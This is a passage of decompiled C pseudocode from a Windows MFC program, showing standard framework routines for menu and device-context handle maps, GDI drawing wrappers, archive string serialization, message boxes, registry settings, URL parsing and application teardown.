    if ( !v3 )
    {
      if ( Size )
      {
        if ( Size != -1 )
        {
          Thread = AfxGetThread();
          if ( Thread )
          {
            v5 = (void (__stdcall *)(_DWORD, _DWORD))*((_DWORD *)Thread + 21);
            if ( v5 )
              v5(0, 0);
          }
        }
        sub_4198E6(*((_DWORD *)ModuleThreadState + 8));
        sub_4198E6(*((_DWORD *)ModuleThreadState + 7));
        sub_4198E6(*((_DWORD *)ModuleThreadState + 6));
        sub_4198E6(*((_DWORD *)ModuleThreadState + 5));
        sub_4198E6(*((_DWORD *)ModuleThreadState + 9));
      }
      v6 = *((_DWORD *)AfxGetModuleState() + 1);
      Data = CThreadLocalObject::GetData(
               (CThreadLocalObject *)&unk_442A6C,
               CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
      v8 = Data;
      if ( v6
        && (!*((_DWORD *)Data + 3) || sub_40DC3D(*((_DWORD **)Data + 3)) < *(_DWORD *)(v6 + 184))
        && *(_DWORD *)(v6 + 184) )
      {
        v9 = (_DWORD *)*((_DWORD *)v8 + 3);
        Sizea = 0;
        if ( v9 )
        {
          Sizea = sub_40DC3D(v9);
          sub_40AD16(*((LPVOID *)v8 + 3));
        }
        v10 = malloc(*(_DWORD *)(v6 + 184));
        *((_DWORD *)v8 + 3) = v10;
        if ( !v10 && Sizea )
          *((_DWORD *)v8 + 3) = malloc(Sizea);
      }
    }
  }
  return *((_DWORD *)ModuleThreadState + 4) != 0;
}
// 4198E6: using guessed type int __thiscall sub_4198E6(_DWORD);

//----- (004197C2) --------------------------------------------------------
_DWORD *__thiscall sub_4197C2(_DWORD *this, int a2, int a3, int a4)
{
  sub_415748(this + 1, 10);
  sub_415748(this + 8, 4);
  *this = &CHandleMap::`vftable';
  sub_41578B((int)(this + 8), 7, 0);
  this[15] = a2;
  this[16] = a3;
  this[17] = a4;
  return this;
}
// 41FF08: using guessed type void *CHandleMap::`vftable';

//----- (004199BD) --------------------------------------------------------
struct CObject *__stdcall sub_4199BD(void *a1)
{
  CHandleMap *v1; // eax

  v1 = afxMapHMENU((LPVOID)1);
  return CHandleMap::FromHandle(v1, a1);
}

//----- (004199D2) --------------------------------------------------------
void *__stdcall sub_4199D2(void *a1)
{
  struct CHandleMap *v1; // ecx
  void *result; // eax

  v1 = afxMapHMENU(0);
  result = 0;
  if ( v1 )
    return CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v1 + 4), a1);
  return result;
}

//----- (004199F0) --------------------------------------------------------
unsigned int __thiscall sub_4199F0(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[1];
  if ( v2 )
  {
    v3 = afxMapHMENU(0);
    if ( v3 )
      sub_41593F((_DWORD *)v3 + 1, this[1]);
  }
  this[1] = 0;
  return v2;
}

//----- (00419A1A) --------------------------------------------------------
BOOL __thiscall sub_419A1A(unsigned int *this)
{
  HMENU v2; // eax

  if ( !this[1] )
    return 0;
  v2 = (HMENU)sub_4199F0(this);
  return DestroyMenu(v2);
}

//----- (00419A30) --------------------------------------------------------
int __stdcall sub_419A30(int a1, int a2, int a3, int a4)
{
  int v4; // ebx
  struct CWinThread *Thread; // esi
  int v6; // edi
  int v7; // ecx
  int v8; // eax

  v4 = -1;
  Thread = AfxGetThread();
  v6 = *((_DWORD *)AfxGetModuleState() + 1);
  if ( sub_41C633(a1, a2, a3, a4) && (!v6 || (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 132))(v6)) )
  {
    if ( (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 80))(Thread) )
    {
      v8 = (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 84))(Thread);
    }
    else
    {
      v7 = *((_DWORD *)Thread + 7);
      if ( v7 )
        (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 88))(v7);
      v8 = (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 104))(Thread);
    }
    v4 = v8;
  }
  AfxWinTerm();
  return v4;
}
// 41C633: using guessed type _DWORD __stdcall sub_41C633(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00419ACD) --------------------------------------------------------
unsigned int *__thiscall sub_419ACD(unsigned int *lpMem, char a2)
{
  sub_419BA1(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (00419B5B) --------------------------------------------------------
struct CObject *__stdcall sub_419B5B(void *a1)
{
  CHandleMap *v1; // eax

  v1 = afxMapHDC((LPVOID)1);
  return CHandleMap::FromHandle(v1, a1);
}

//----- (00419B70) --------------------------------------------------------
unsigned int __thiscall sub_419B70(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[1];
  if ( v2 )
  {
    v3 = afxMapHDC(0);
    if ( v3 )
      sub_41593F((_DWORD *)v3 + 1, this[1]);
  }
  (*(void (__thiscall **)(unsigned int *))(*this + 20))(this);
  this[1] = 0;
  return v2;
}

//----- (00419BA1) --------------------------------------------------------
void *__thiscall sub_419BA1(unsigned int *this)
{
  void *result; // eax
  HDC v2; // eax

  result = &loc_41D174;
  *this = (unsigned int)&CDC::`vftable';
  if ( this[1] )
  {
    v2 = (HDC)sub_419B70(this);
    return (void *)DeleteDC(v2);
  }
  return result;
}
// 41F600: using guessed type void *CDC::`vftable';

//----- (00419BF5) --------------------------------------------------------
int __thiscall sub_419BF5(HDC *this)
{
  int v2; // ebx

  v2 = 0;
  if ( this[2] )
    v2 = SaveDC(this[2]);
  if ( this[1] != this[2] && SaveDC(this[1]) )
    return -1;
  return v2;
}

//----- (00419C64) --------------------------------------------------------
struct CObject *__thiscall sub_419C64(_DWORD *this, int i)
{
  HGDIOBJ StockObject; // eax
  HDC v4; // ecx
  void *v5; // ebx
  HGDIOBJ v6; // eax
  HDC v7; // esi

  StockObject = GetStockObject(i);
  v4 = (HDC)this[1];
  v5 = StockObject;
  v6 = 0;
  if ( v4 != (HDC)this[2] )
    v6 = SelectObject(v4, v5);
  v7 = (HDC)this[2];
  if ( v7 )
    v6 = SelectObject(v7, v5);
  return sub_419FD4(v6);
}

//----- (00419CA0) --------------------------------------------------------
struct CObject *__thiscall sub_419CA0(_DWORD *this, int a2)
{
  HGDIOBJ v3; // eax
  HDC v4; // ecx
  HDC v5; // esi
  void *v6; // eax

  v3 = 0;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
  {
    if ( a2 )
      v3 = *(HGDIOBJ *)(a2 + 4);
    v3 = SelectObject(v4, v3);
  }
  v5 = (HDC)this[2];
  if ( v5 )
  {
    if ( a2 )
      v6 = *(void **)(a2 + 4);
    else
      v6 = 0;
    v3 = SelectObject(v5, v6);
  }
  return sub_419FD4(v3);
}

//----- (00419CE6) --------------------------------------------------------
int __thiscall sub_419CE6(_DWORD *this, COLORREF color)
{
  int result; // eax
  HDC v4; // ecx
  HDC v5; // esi

  result = -1;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
    result = SetBkColor(v4, color);
  v5 = (HDC)this[2];
  if ( v5 )
    return SetBkColor(v5, color);
  return result;
}

//----- (00419D15) --------------------------------------------------------
int __thiscall sub_419D15(_DWORD *this, COLORREF color)
{
  int result; // eax
  HDC v4; // ecx
  HDC v5; // esi

  result = -1;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
    result = SetTextColor(v4, color);
  v5 = (HDC)this[2];
  if ( v5 )
    return SetTextColor(v5, color);
  return result;
}

//----- (00419D44) --------------------------------------------------------
int __thiscall sub_419D44(_DWORD *this, int iMode)
{
  int result; // eax
  HDC v4; // ecx
  HDC v5; // esi

  result = 0;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
    result = SetMapMode(v4, iMode);
  v5 = (HDC)this[2];
  if ( v5 )
    return SetMapMode(v5, iMode);
  return result;
}

//----- (00419F52) --------------------------------------------------------
int __thiscall sub_419F52(HDC *this, LPRECT lprect)
{
  return GetClipBox(this[1], lprect);
}

//----- (00419FD4) --------------------------------------------------------
struct CObject *__stdcall sub_419FD4(void *a1)
{
  CHandleMap *v1; // eax

  v1 = afxMapHGDIOBJ((LPVOID)1);
  return CHandleMap::FromHandle(v1, a1);
}

//----- (00419FE9) --------------------------------------------------------
unsigned int __thiscall sub_419FE9(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[1];
  if ( v2 )
  {
    v3 = afxMapHGDIOBJ(0);
    if ( v3 )
      sub_41593F((_DWORD *)v3 + 1, this[1]);
  }
  this[1] = 0;
  return v2;
}

//----- (0041A013) --------------------------------------------------------
BOOL __thiscall sub_41A013(unsigned int *this)
{
  void *v2; // eax

  if ( !this[1] )
    return 0;
  v2 = (void *)sub_419FE9(this);
  return DeleteObject(v2);
}

//----- (0041A029) --------------------------------------------------------
CArchive *__stdcall sub_41A029(CArchive *a1, const void **a2)
{
  int v2; // edx

  v2 = *((_DWORD *)*a2 - 2);
  if ( v2 >= 255 )
  {
    if ( v2 >= 65534 )
    {
      CArchive::operator<<(255);
      CArchive::operator<<(0xFFFF);
      sub_40A00B(*((_DWORD *)*a2 - 2));
    }
    else
    {
      CArchive::operator<<(255);
      CArchive::operator<<(*((_WORD *)*a2 - 4));
    }
  }
  else
  {
    CArchive::operator<<(*((_DWORD *)*a2 - 2));
  }
  CArchive::Write(a1, *a2, *((_DWORD *)*a2 - 2));
  return a1;
}
// 409FC1: using guessed type _DWORD __stdcall CArchive::operator<<(char);
// 409FE4: using guessed type _DWORD __stdcall CArchive::operator<<(__int16);
// 40A00B: using guessed type _DWORD __stdcall sub_40A00B(_DWORD);

//----- (0041A0F9) --------------------------------------------------------
struct CArchive *__stdcall sub_41A0F9(struct CArchive *a1, CString *a2)
{
  int v2; // ebx
  unsigned int v3; // esi
  wchar_t *v4; // esi
  wchar_t *v6; // [esp-4h] [ebp-14h]
  unsigned int StringLength; // [esp+Ch] [ebp-4h]

  v2 = 0;
  StringLength = ReadStringLength(a1);
  if ( StringLength == -1 )
  {
    v2 = 1;
    StringLength = ReadStringLength(a1);
  }
  v3 = StringLength * (v2 + 1);
  if ( StringLength )
  {
    CString::GetBufferSetLength(a2, v3 + v2);
    if ( sub_41A191((int)a1, *(char **)a2, v3) != v3 )
      sub_41A56C(3, 0);
    if ( v2 )
    {
      v6 = *(wchar_t **)a2;
      v6[StringLength] = 0;
      *(_DWORD *)a2 = off_42667C;
      v4 = v6 - 6;
      CString::operator=(a2, v6);
      sub_41680D(v4);
    }
  }
  else
  {
    CString::GetBufferSetLength(a2, 0);
  }
  return a1;
}
// 42667C: using guessed type void *off_42667C;

//----- (0041A191) --------------------------------------------------------
unsigned int __thiscall sub_41A191(int this, char *a2, unsigned int a3)
{
  const void *v5; // eax
  size_t v6; // edi
  unsigned int v7; // ebx
  unsigned int v8; // edi
  int v9; // eax
  unsigned int v10; // edi
  int v11; // eax
  char *v12; // eax
  size_t v13; // edi
  int v14; // [esp+8h] [ebp-8h]
  int v15; // [esp+8h] [ebp-8h]
  unsigned int v16; // [esp+Ch] [ebp-4h]
  unsigned int v17; // [esp+Ch] [ebp-4h]
  char *v18; // [esp+18h] [ebp+8h]

  if ( !a3 )
    return 0;
  v5 = *(const void **)(this + 36);
  v6 = *(_DWORD *)(this + 40) - (_DWORD)v5;
  if ( a3 < v6 )
    v6 = a3;
  memcpy_0(a2, v5, v6);
  *(_DWORD *)(this + 36) += v6;
  v18 = &a2[v6];
  v7 = a3 - v6;
  if ( a3 != v6 )
  {
    v8 = v7 - v7 % *(_DWORD *)(this + 28);
    v14 = 0;
    v16 = v8;
    do
    {
      v9 = (*(int (__thiscall **)(_DWORD, char *, unsigned int))(**(_DWORD **)(this + 32) + 52))(
             *(_DWORD *)(this + 32),
             v18,
             v16);
      v18 += v9;
      v14 += v9;
      v16 -= v9;
    }
    while ( v9 && v16 );
    v7 -= v14;
    if ( v14 == v8 )
    {
      v10 = 0;
      if ( *(_DWORD *)(this + 8) )
      {
        (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, int, int))(**(_DWORD **)(this + 32) + 80))(
          *(_DWORD *)(this + 32),
          0,
          *(_DWORD *)(this + 28),
          this + 44,
          this + 40);
        v12 = *(char **)(this + 44);
        *(_DWORD *)(this + 36) = v12;
      }
      else
      {
        v17 = v7;
        if ( v7 <= *(_DWORD *)(this + 28) )
          v17 = *(_DWORD *)(this + 28);
        v15 = *(_DWORD *)(this + 44);
        do
        {
          v11 = (*(int (__thiscall **)(_DWORD, int, unsigned int))(**(_DWORD **)(this + 32) + 52))(
                  *(_DWORD *)(this + 32),
                  v15,
                  v17);
          v15 += v11;
          v17 -= v11;
          v10 += v11;
        }
        while ( v11 && v17 && v10 < v7 );
        v12 = *(char **)(this + 44);
        *(_DWORD *)(this + 36) = v12;
        *(_DWORD *)(this + 40) = &v12[v10];
      }
      v13 = *(_DWORD *)(this + 40) - (_DWORD)v12;
      if ( v7 < v13 )
        v13 = v7;
      memcpy_0(v18, v12, v13);
      *(_DWORD *)(this + 36) += v13;
      v7 -= v13;
    }
  }
  return a3 - v7;
}

//----- (0041A330) --------------------------------------------------------
int __thiscall sub_41A330(int this)
{
  int v2; // edx
  int v3; // eax
  int result; // eax
  int v5; // eax
  int v6; // edx
  int *v7; // edi

  if ( (*(_BYTE *)(this + 20) & 1) != 0 )
  {
    v2 = *(_DWORD *)(this + 40);
    v3 = *(_DWORD *)(this + 36);
    if ( v2 != v3 )
      (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 32) + 40))(*(_DWORD *)(this + 32), v3 - v2, 1);
    result = *(_DWORD *)(this + 40);
    *(_DWORD *)(this + 36) = result;
  }
  else
  {
    v5 = *(_DWORD *)(this + 36);
    v6 = *(_DWORD *)(this + 44);
    v7 = (int *)(this + 44);
    if ( *(_DWORD *)(this + 8) )
    {
      if ( v5 != v6 )
        (*(void (__stdcall **)(int, int, _DWORD, _DWORD))(**(_DWORD **)(this + 32) + 80))(2, v5 - v6, 0, 0);
      (*(void (__thiscall **)(_DWORD, int, _DWORD, int, int))(**(_DWORD **)(this + 32) + 80))(
        *(_DWORD *)(this + 32),
        1,
        *(_DWORD *)(this + 28),
        this + 44,
        this + 40);
    }
    else if ( v5 != v6 )
    {
      (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 32) + 56))(*(_DWORD *)(this + 32), v6, v5 - v6);
    }
    result = *v7;
    *(_DWORD *)(this + 36) = *v7;
  }
  return result;
}

//----- (0041A4CC) --------------------------------------------------------
int __thiscall sub_41A4CC(int this, LPSTR lpString1, int iMaxLength, char *a4)
{
  LPCSTR lpString2; // [esp+8h] [ebp-10h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  if ( a4 )
    *(_DWORD *)a4 = *(_DWORD *)(this + 8) + 61872;
  lpString2 = (LPCSTR)off_42667C;
  v7 = 1;
  sub_416693((CString *)&a4, (LPCSTR *)(this + 12));
  if ( !*((_DWORD *)a4 - 2) )
    CString::LoadStringA((CString *)&a4, 0xF006u);
  sub_41AC8E((struct CString *)&lpString2, *(_DWORD *)(this + 8) + 61872, a4);
  lstrcpynA(lpString1, lpString2, iMaxLength);
  LOBYTE(v7) = 0;
  sub_41691E(&a4);
  v7 = -1;
  sub_41691E(&lpString2);
  return 1;
}
// 42667C: using guessed type void *off_42667C;

//----- (0041A56C) --------------------------------------------------------
void __stdcall __noreturn sub_41A56C(int a1, LPCSTR lpString)
{
  CException *v2; // eax
  CException *v3; // esi
  CException *pExceptionObject; // [esp+8h] [ebp-10h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  v2 = (CException *)sub_41665F(0x10u);
  v3 = v2;
  v5 = 0;
  if ( v2 )
  {
    CException::CException(v2);
    *((_DWORD *)v3 + 3) = off_42667C;
    LOBYTE(v5) = 2;
    *(_DWORD *)v3 = &CArchiveException::`vftable';
    *((_DWORD *)v3 + 2) = a1;
    CString::operator=((CException *)((char *)v3 + 12), lpString);
  }
  else
  {
    v3 = 0;
  }
  v5 = -1;
  pExceptionObject = v3;
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI4PAVCArchiveException__);
}
// 41F7D8: using guessed type void *CArchiveException::`vftable';
// 42667C: using guessed type void *off_42667C;

//----- (0041A7E8) --------------------------------------------------------
int __thiscall sub_41A7E8(_DWORD *this)
{
  int v1; // ecx

  v1 = this[32];
  if ( v1 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 32))(v1);
  else
    return 1;
}

//----- (0041A7FB) --------------------------------------------------------
int __thiscall sub_41A7FB(_DWORD *this, int a2)
{
  int v2; // ecx
  int result; // eax

  v2 = this[42];
  if ( v2 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 4))(v2, a2);
  return result;
}

//----- (0041A845) --------------------------------------------------------
int __thiscall sub_41A845(_DWORD *this, int a2)
{
  int v2; // ecx

  v2 = this[32];
  if ( v2 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 48))(v2, a2);
  else
    return 0;
}

//----- (0041A892) --------------------------------------------------------
int __stdcall sub_41A892(int a1)
{
  int result; // eax
  int v2; // esi
  int v3; // ecx

  result = sub_409E01();
  v2 = result;
  if ( result )
  {
    result = (*(int (__thiscall **)(int))(*(_DWORD *)result + 176))(result);
    if ( result )
    {
      v3 = *(_DWORD *)(v2 + 104);
      if ( v3 )
        return (*(int (__thiscall **)(int, int))(*(_DWORD *)v3 + 100))(v3, a1);
    }
  }
  return result;
}

//----- (0041A8C0) --------------------------------------------------------
int __thiscall sub_41A8C0(int *this, LPCSTR lpText, UINT uType, int a4)
{
  int *v5; // esi
  LRESULT v6; // eax
  UINT v7; // ebx
  UINT v8; // eax
  CHAR *v9; // edi
  int v10; // edi
  CHAR Filename[260]; // [esp+Ch] [ebp-114h] BYREF
  int *v13; // [esp+110h] [ebp-10h]
  HWND v14; // [esp+114h] [ebp-Ch]
  int v15; // [esp+118h] [ebp-8h]
  HWND hWnd; // [esp+11Ch] [ebp-4h] BYREF

  v13 = this;
  sub_41A892(0);
  v5 = 0;
  v14 = sub_41AA38(0, &hWnd);
  if ( v14 && (v6 = SendMessageA(hWnd, 0x376u, 0, 0)) != 0 )
  {
    v5 = (int *)v6;
  }
  else if ( this )
  {
    v5 = this + 39;
  }
  v15 = 0;
  if ( v5 )
  {
    v15 = *v5;
    if ( a4 )
      *v5 = a4 + 196608;
  }
  v7 = uType;
  if ( (uType & 0xF0) == 0 )
  {
    v8 = uType & 0xF;
    if ( v8 <= 1 || v8 > 2 && v8 <= 4 )
      v7 = uType | 0x30;
  }
  if ( this )
  {
    v9 = (CHAR *)this[30];
  }
  else
  {
    v9 = Filename;
    GetModuleFileNameA(0, Filename, 0x104u);
  }
  v10 = MessageBoxA(v14, lpText, v9, v7);
  if ( v5 )
    *v5 = v15;
  if ( hWnd )
    EnableWindow(hWnd, 1);
  sub_41A892(1);
  return v10;
}

//----- (0041A9A7) --------------------------------------------------------
int __stdcall sub_41A9A7(LPCSTR lpText, UINT uType, int a3)
{
  int v3; // eax

  v3 = *((_DWORD *)AfxGetModuleState() + 1);
  if ( v3 )
    return (*(int (__thiscall **)(int, LPCSTR, UINT, int))(*(_DWORD *)v3 + 140))(v3, lpText, uType, a3);
  else
    return sub_41A8C0(0, lpText, uType, a3);
}

//----- (0041A9DF) --------------------------------------------------------
int __stdcall sub_41A9DF(unsigned int a1, UINT uType, int a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // esi
  LPCSTR lpText; // [esp+0h] [ebp-10h] BYREF
  int v8; // [esp+Ch] [ebp-4h]

  lpText = (LPCSTR)off_42667C;
  v8 = 0;
  CString::LoadStringA((CString *)&lpText, a1);
  v3 = a3;
  if ( a3 == -1 )
    v3 = a1;
  v4 = sub_41A9A7(lpText, uType, v3);
  v8 = -1;
  v5 = v4;
  sub_41691E(&lpText);
  return v5;
}
// 42667C: using guessed type void *off_42667C;

//----- (0041AA38) --------------------------------------------------------
HWND __stdcall sub_41AA38(HWND hWnd, HWND *a2)
{
  HWND i; // esi
  int v3; // eax
  HWND v4; // edi
  HWND j; // eax

  i = hWnd;
  if ( hWnd )
    goto LABEL_17;
  v3 = unknown_libname_33();
  if ( v3 || (v3 = sub_409E01()) != 0 )
  {
    for ( i = *(HWND *)(v3 + 28); i; i = GetParent(i) )
    {
LABEL_17:
      if ( (GetWindowLongA(i, -16) & 0x40000000) == 0 )
        break;
    }
  }
  else
  {
    i = 0;
  }
  v4 = i;
  for ( j = i; j; j = GetParent(j) )
    v4 = j;
  if ( !hWnd && i )
    i = GetLastActivePopup(i);
  if ( a2 )
  {
    if ( v4 && IsWindowEnabled(v4) && v4 != i )
    {
      *a2 = v4;
      EnableWindow(v4, 0);
    }
    else
    {
      *a2 = 0;
    }
  }
  return i;
}
// 41AAD4: using guessed type int unknown_libname_33(void);

//----- (0041AAE0) --------------------------------------------------------
HKEY __thiscall sub_41AAE0(int this, LPCSTR lpAppName, LPCSTR lpValueName, int Data)
{
  HKEY result; // eax
  HKEY v6; // esi
  LSTATUS v7; // edi
  CHAR String[16]; // [esp+4h] [ebp-10h] BYREF

  if ( *(_DWORD *)(this + 124) )
  {
    result = CWinApp::GetSectionKey((CWinApp *)this, lpAppName);
    v6 = result;
    if ( result )
    {
      v7 = RegSetValueExA(result, lpValueName, 0, 4u, (const BYTE *)&Data, 4u);
      RegCloseKey(v6);
      return (HKEY)(v7 == 0);
    }
  }
  else
  {
    wsprintfA(String, "%d", Data);
    return (HKEY)WritePrivateProfileStringA(lpAppName, lpValueName, String, *(LPCSTR *)(this + 144));
  }
  return result;
}

//----- (0041AC8E) --------------------------------------------------------
void __stdcall sub_41AC8E(struct CString *a1, UINT uID, char *a3)
{
  AfxFormatStrings(a1, uID, (const char *const *)&a3, 1);
}

//----- (0041ACBE) --------------------------------------------------------
BOOL __stdcall sub_41ACBE(
        LPCSTR lpszUrl,
        LPURL_COMPONENTSA lpUrlComponents,
        _DWORD *a3,
        INTERNET_PORT *a4,
        DWORD dwFlags)
{
  DWORD v5; // esi
  void *v6; // ebx
  BOOL v8; // edi
  _DWORD *v9; // eax
  CHAR szBuffer[2084]; // [esp+Ch] [ebp-82Ch] BYREF
  int v11; // [esp+830h] [ebp-8h]
  DWORD dwBufferLength; // [esp+834h] [ebp-4h] BYREF
  DWORD dwFlagsa; // [esp+850h] [ebp+18h]

  if ( !lpUrlComponents || !lpszUrl )
    return 0;
  v11 = 0;
  v5 = dwFlags & 0x3E000000;
  dwFlagsa = dwFlags & 0xC0000000;
  dwBufferLength = 2084;
  if ( InternetCanonicalizeUrlA(lpszUrl, szBuffer, &dwBufferLength, v5) )
  {
    v6 = szBuffer;
  }
  else
  {
    if ( GetLastError() != 122 )
      return 0;
    v6 = sub_41665F(dwBufferLength);
    v11 = 1;
    if ( !InternetCanonicalizeUrlA(lpszUrl, (LPSTR)v6, &dwBufferLength, v5) )
    {
      sub_416688(v6);
      return 0;
    }
  }
  v8 = InternetCrackUrlA((LPCSTR)v6, 0, dwFlagsa, lpUrlComponents);
  if ( v11 )
    sub_416688(v6);
  if ( v8 )
  {
    *a4 = lpUrlComponents->nPort;
    switch ( lpUrlComponents->nScheme )
    {
      case INTERNET_SCHEME_FTP:
        *a3 = 1;
        return v8;
      case INTERNET_SCHEME_GOPHER:
        *a3 = 2;
        return v8;
      case INTERNET_SCHEME_HTTP:
        *a3 = 3;
        return v8;
      case INTERNET_SCHEME_HTTPS:
        *a3 = 4107;
        return v8;
      case INTERNET_SCHEME_FILE:
        *a3 = 4097;
        return v8;
      case INTERNET_SCHEME_NEWS:
        *a3 = 4102;
        return v8;
    }
    v9 = a3;
    if ( lpUrlComponents->nScheme == INTERNET_SCHEME_MAILTO )
    {
      *a3 = 4098;
      return v8;
    }
  }
  else
  {
    v9 = a3;
  }
  *v9 = 4096;
  return v8;
}

//----- (0041ADF2) --------------------------------------------------------
BOOL __stdcall sub_41ADF2(
        LPCSTR lpszUrl,
        _DWORD *a2,
        CString *a3,
        CString *a4,
        INTERNET_PORT *a5,
        CString *a6,
        CString *a7,
        DWORD dwFlags)
{
  BOOL v9; // edi
  struct $BC2FB811D417144E831EE3AEA4A279C8 UrlComponents; // [esp+4h] [ebp-3Ch] BYREF

  *a2 = 4096;
  if ( !lpszUrl )
    return 0;
  memset(&UrlComponents, 0, sizeof(UrlComponents));
  UrlComponents.dwStructSize = 60;
  UrlComponents.dwHostNameLength = 256;
  UrlComponents.lpszHostName = (LPSTR)sub_416B9F(a3, 257);
  UrlComponents.dwUrlPathLength = 2048;
  UrlComponents.lpszUrlPath = (LPSTR)sub_416B9F(a4, 2049);
  UrlComponents.dwUserNameLength = 128;
  UrlComponents.lpszUserName = (LPSTR)sub_416B9F(a6, 129);
  UrlComponents.dwPasswordLength = 128;
  UrlComponents.lpszPassword = (LPSTR)sub_416B9F(a7, 129);
  v9 = sub_41ACBE(lpszUrl, &UrlComponents, a2, a5, dwFlags);
  CString::ReleaseBuffer(a3, -1);
  CString::ReleaseBuffer(a4, -1);
  CString::ReleaseBuffer(a6, -1);
  CString::ReleaseBuffer(a7, -1);
  return v9;
}

//----- (0041AEBF) --------------------------------------------------------
int __thiscall sub_41AEBF(int this)
{
  sub_415748((_DWORD *)this, 10);
  unknown_libname_18(0);
  *(_DWORD *)(this + 28) = &CCriticalSection::`vftable';
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 36));
  *(_DWORD *)this = &CSessionMapPtrToPtr::`vftable';
  return this;
}
// 40A5F1: using guessed type _DWORD __stdcall unknown_libname_18(_DWORD);
// 41F908: using guessed type void *CSessionMapPtrToPtr::`vftable';
// 41F918: using guessed type void *CCriticalSection::`vftable';

//----- (0041AF0E) --------------------------------------------------------
LPVOID __thiscall sub_41AF0E(LPVOID lpMem, char a2)
{
  sub_41AF2A((int)lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0041AF2A) --------------------------------------------------------
int __thiscall sub_41AF2A(int this)
{
  _DWORD *v2; // esi

  *(_DWORD *)this = &CSessionMapPtrToPtr::`vftable';
  v2 = (_DWORD *)(this + 28);
  *(_DWORD *)(this + 28) = &CCriticalSection::`vftable';
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 36));
  sub_40A61C(v2);
  return sub_4157FB((_DWORD *)this);
}
// 41F908: using guessed type void *CSessionMapPtrToPtr::`vftable';
// 41F918: using guessed type void *CCriticalSection::`vftable';

//----- (0041AF79) --------------------------------------------------------
_DWORD *__thiscall sub_41AF79(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &_AFX_WIN_STATE::`vftable';
  return result;
}
// 41F2B0: using guessed type void *_AFX_WIN_STATE::`vftable';

//----- (0041AF82) --------------------------------------------------------
void **__thiscall sub_41AF82(void **hMem, char a2)
{
  sub_41CA92(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041B087) --------------------------------------------------------
LPVOID __thiscall sub_41B087(LPVOID lpMem, char a2)
{
  sub_41B0E7((int)lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0041B0E3) --------------------------------------------------------
int sub_41B0E3()
{
  return 1;
}

//----- (0041B0E7) --------------------------------------------------------
void __thiscall sub_41B0E7(int this)
{
  int v2; // ecx
  int v3; // ecx
  ATOM v4; // ax
  ATOM v5; // ax
  int v6; // ecx
  struct AFX_MODULE_STATE *ModuleState; // eax

  *(_DWORD *)this = &CWinApp::`vftable';
  v2 = *(_DWORD *)(this + 128);
  if ( v2 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v2 + 4))(v2, 1);
  v3 = *(_DWORD *)(this + 168);
  if ( v3 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 20))(v3, 1);
  if ( !*((_BYTE *)AfxGetModuleState() + 20) )
  {
    if ( dword_442830 )
    {
      (*(void (__thiscall **)(int, int))(*(_DWORD *)dword_442830 + 4))(dword_442830, 1);
      dword_442830 = 0;
    }
    if ( dword_44282C )
    {
      (*(void (__thiscall **)(int, int))(*(_DWORD *)dword_44282C + 4))(dword_44282C, 1);
      dword_44282C = 0;
    }
  }
  if ( *(_DWORD *)(this + 148) )
    AfxGlobalFree(*(HGLOBAL *)(this + 148));
  if ( *(_DWORD *)(this + 152) )
    AfxGlobalFree(*(HGLOBAL *)(this + 152));
  v4 = *(_WORD *)(this + 176);
  if ( v4 )
    GlobalDeleteAtom(v4);
  v5 = *(_WORD *)(this + 178);
  if ( v5 )
    GlobalDeleteAtom(v5);
  v6 = *(_DWORD *)(this + 172);
  if ( v6 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v6 + 4))(v6, 1);
  ModuleState = AfxGetModuleState();
  if ( *((_DWORD *)ModuleState + 4) == *(_DWORD *)(this + 120) )
    *((_DWORD *)ModuleState + 4) = 0;
  if ( *((_DWORD *)ModuleState + 1) == this )
    *((_DWORD *)ModuleState + 1) = 0;
  sub_40AD16(*(LPVOID *)(this + 120));
  sub_40AD16(*(LPVOID *)(this + 124));
  sub_40AD16(*(LPVOID *)(this + 136));
  sub_40AD16(*(LPVOID *)(this + 140));
  sub_40AD16(*(LPVOID *)(this + 144));
  *(_DWORD *)(this + 40) = 0;
  CWinThread::~CWinThread((CWinThread *)this);
}
// 41F2B8: using guessed type void *CWinApp::`vftable';
// 44282C: using guessed type int dword_44282C;
// 442830: using guessed type int dword_442830;

//----- (0041B21D) --------------------------------------------------------
HKEY __thiscall sub_41B21D(_DWORD *this)
{
  int v2; // ecx
  HKEY result; // eax

  v2 = this[42];
  if ( v2 )
